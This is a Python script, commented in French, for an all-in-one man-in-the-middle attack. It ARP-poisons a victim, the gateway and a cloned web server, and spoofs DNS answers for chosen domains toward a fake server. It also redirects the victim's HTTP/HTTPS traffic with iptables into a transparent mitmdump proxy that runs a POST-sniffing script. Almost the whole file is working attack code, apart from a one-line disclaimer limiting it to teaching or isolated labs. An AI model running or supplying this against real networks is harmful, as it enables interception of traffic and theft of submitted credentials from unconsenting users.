#!/usr/bin/env python3
"""
All-in-One MITM Tool : ARP poisoning + DNS spoofing + HTTP(S) transparent proxy + HTTP POST sniffer

À utiliser uniquement à des fins pédagogiques ou en environnement de test isolé.
"""

import os, threading, subprocess
from scapy.all import Ether, ARP, sendp, IP, UDP, DNS, DNSQR, DNSRR, Raw, conf, send
from netfilterqueue import NetfilterQueue
from pathlib import Path

# --- CONFIGURATION À PERSONNALISER ---
INTERFACE        = "eth0"                      # Interface réseau (ex: "eth0", "enp0s3")
TARGET_IP        = "192.168.X.X"               # IP de la victime
GATEWAY_IP       = "192.168.X.1"               # IP de la passerelle
WEBSERVER_IP     = "192.168.X.X"               # IP du faux serveur web (clone)
VICTIM_MAC       = "AA:BB:CC:DD:EE:FF"         # MAC de la victime
GATEWAY_MAC      = "AA:BB:CC:DD:EE:11"         # MAC de la passerelle
WEBSERVER_MAC    = "AA:BB:CC:DD:EE:22"         # MAC du faux serveur web
DOMAINS_FILE     = "dns.txt"            # Format: nom_domaine:IP_fake
QUEUE_NUM        = 0
MITMPROXY_PORT   = 8080
MITMPROXY_BIN    = "/chemin/vers/mitmproxy"    # Chemin absolu vers mitmproxy/mitmdump
MITMPROXY_SCRIPT = str(Path(__file__).parent / "post_sniffer.py")
conf.logLevel    = "ERROR"
# --------------------------------------

class ARPPoison(threading.Thread):
    def __init__(self, src_ip, dst_ip, dst_mac, iface):
        super().__init__(daemon=True)
        self.src_ip, self.dst_ip, self.dst_mac, self.iface = src_ip, dst_ip, dst_mac, iface
    def run(self):
        pkt = Ether(dst=self.dst_mac)/ARP(psrc=self.src_ip, pdst=self.dst_ip, op=2)
        sendp(pkt, iface=self.iface, inter=1, loop=1, verbose=False)

class MITM:
    def __init__(self, iface, victim, gateway, queue_num, mapping, vic_mac, gw_mac):
        self.iface = iface
        self.victim = victim
        self.gateway = gateway
        self.queue_num = queue_num
        self.mapping = mapping
        self.vic_mac = vic_mac
        self.gw_mac = gw_mac
        self.queue = NetfilterQueue()
        self.mitm_proc = None

    def enable_forward(self):
        os.system('sysctl -w net.ipv4.ip_forward=1 > /dev/null')
    def disable_forward(self):
        os.system('sysctl -w net.ipv4.ip_forward=0 > /dev/null')

    def setup_iptables(self):
        os.system('iptables -P FORWARD ACCEPT')
        os.system('iptables -F; iptables -t nat -F; iptables -t raw -F')
        os.system('iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT')

        os.system(f"iptables -t nat -A PREROUTING -i {self.iface} -p tcp "
                  f"-s {self.victim} -m multiport --dports 80,443 -j REDIRECT --to-port {MITMPROXY_PORT}")
        
        for p in ('udp', 'tcp'):
            os.system(f"iptables -t raw -I PREROUTING -p {p} -s {self.victim} "
                      f"--dport 53 -j NFQUEUE --queue-num {self.queue_num}")
        
        os.system(f"iptables -t nat -A POSTROUTING -o {self.iface} -s {self.victim} -j MASQUERADE")
        os.system(f"iptables -t nat -A POSTROUTING -o {self.iface} -d {WEBSERVER_IP} -j MASQUERADE")

    def clear_iptables(self):
        os.system('iptables -F; iptables -t nat -F; iptables -t raw -F')

    def start_mitmproxy(self):
        print(f"[*] Lancement mitmdump sur le port {MITMPROXY_PORT}")
        self.mitm_proc = subprocess.Popen([
            MITMPROXY_BIN.replace("mitmproxy", "mitmdump"),
            "--mode", "transparent",
            "--listen-port", str(MITMPROXY_PORT),
            "--showhost",
            "-s", MITMPROXY_SCRIPT
        ])

    def dns_callback(self, pkt):
        data = pkt.get_payload()
        ip = IP(data)
        if ip.haslayer(DNSQR) and ip[DNS].qr == 0:
            q = ip[DNSQR].qname.decode().rstrip('.')
            print(f"[DEBUG] DNS q={q}")
            if q in self.mapping:
                fake = self.mapping[q]
                print(f"[DNS] Spoof {q} → {fake}")
                resp = (IP(src=GATEWAY_IP, dst=ip.src) /
                        UDP(sport=53, dport=ip[UDP].sport) /
                        DNS(id=ip[DNS].id, qr=1, aa=1, qd=ip[DNS].qd,
                            an=DNSRR(rrname=ip[DNSQR].qname, ttl=300, rdata=fake)))
                send(resp, iface=self.iface, verbose=False)
                pkt.drop()
                return
        pkt.accept()

    def start(self, duration=None):
        print(f"[*] MITM entre {self.victim} et {self.gateway}")
        self.enable_forward()
        self.setup_iptables()
        self.start_mitmproxy()
        print("[*] Attaque MITM en cours (ARP + DNS + TLS Proxy)…")

        try:
            self.queue.bind(self.queue_num, self.dns_callback)
            self.queue.run()
        except KeyboardInterrupt:
            pass
        finally:
            print("[!] Nettoyage en cours…")
            if self.mitm_proc:
                self.mitm_proc.terminate()
                self.mitm_proc.wait()
            self.queue.unbind()
            self.clear_iptables()
            self.disable_forward()
            print("[+] Terminé.")

def load_mapping(path):
    m = {}
    with open(path) as f:
        for line in f:
            if ':' in line:
                host, fake = line.strip().split(':', 1)
                m[host.rstrip('.')] = fake
    return m

if __name__ == "__main__":
    # Poisoning ARP entre victime et passerelle
    t1 = ARPPoison(GATEWAY_IP, TARGET_IP, VICTIM_MAC, INTERFACE)
    t2 = ARPPoison(TARGET_IP, GATEWAY_IP, GATEWAY_MAC, INTERFACE)
    
    # Poisoning ARP entre victime et serveur web (optionnel)
    t3 = ARPPoison(WEBSERVER_IP, TARGET_IP, VICTIM_MAC, INTERFACE)
    t4 = ARPPoison(TARGET_IP, WEBSERVER_IP, WEBSERVER_MAC, INTERFACE)
    
    t1.start(); t2.start(); t3.start(); t4.start()

    mapping = load_mapping(DOMAINS_FILE)
    mitm = MITM(INTERFACE, TARGET_IP, GATEWAY_IP, QUEUE_NUM, mapping, VICTIM_MAC, GATEWAY_MAC)
    mitm.start()
